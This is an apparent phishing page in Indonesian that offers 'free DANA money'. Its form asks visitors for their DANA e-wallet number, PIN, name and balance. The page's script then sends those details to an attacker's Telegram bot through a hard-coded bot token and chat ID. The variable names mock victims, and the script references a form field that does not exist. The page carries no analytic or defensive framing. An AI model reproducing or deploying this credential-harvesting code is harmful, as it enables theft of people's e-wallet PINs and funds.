<!DOCTYPE html>
<html lang="id">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Dapatkan Dana Gratis</title>
</head>

<body>


    <h1 style="text-align: center; color: red;">HARAP ISI DATA INI DENGAN BENAR!!!</h1>

    <form id="anu" style="text-align: center;">
        <input type="text" id="anunyamark" placeholder="Nomor Dana" required><br><br>
        <input type="number" id="sikontoltertipu" placeholder="Pin Dana" required><br><br>
        <input type="text" id="rusdi" placeholder="Nama Dana" required><br><br>
        <input type="text" id="andre" placeholder="Jumlah Dana" required><br><br>
        <button type="submit">Kirim</button>
    </form>

    <script>
        document.getElementById("anu").addEventListener("submit", function(e) {
            e.preventDefault()
        
            let anunyamark = document.getElementById("anunyamark").value.trim()
            let silityou = document.getElementById("silityou").value.trim()
            let sikontoltertipu = document.getElementById("sikontoltertipu").value.trim()
            let rusdi = document.getElementById("rusdi").value.trim()
            let andre = document.getElementById("andre").value.trim()
        
            if (!anunyamark || !silityou || !sikontoltertipu || !rusdi || !andre) {
                alert("Isi Data Dengan Benar Agar Kami Dapat Memproses Permintaan Anda!")
                return
            }
        
            let botToken = "7964926827:AAExhkL9M8wDt4Mqx8lQImZP-_NB4B3uo2c"
            let chatId = "6904521138"
            let jomok = `*Data Akun Dana* \n\nNomor Dana:  ${silityou}\nPin Dana: ${sikontoltertipu}\nNama Dana: ${rusdi}\nJumlah Saldo: ${andre}`
        
            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ chat_id: chatId, text: jomok, parse_mode: "Markdown" })
            })
            .then(res => res.json())
            .then(data => {
                if (data.ok) {
                    alert("Permintaan berhasil dikirim! Tunggu beberapa saat agar permintaan diproses.")
                    document.getElementById("anu").reset()
                } else {
                    alert("Gagal mengirim data!")
                }
            })
            .catch(() => alert("Terjadi kesalahan! Coba beberapa saat lagi"))
        })
    </script>

</body>
</html>
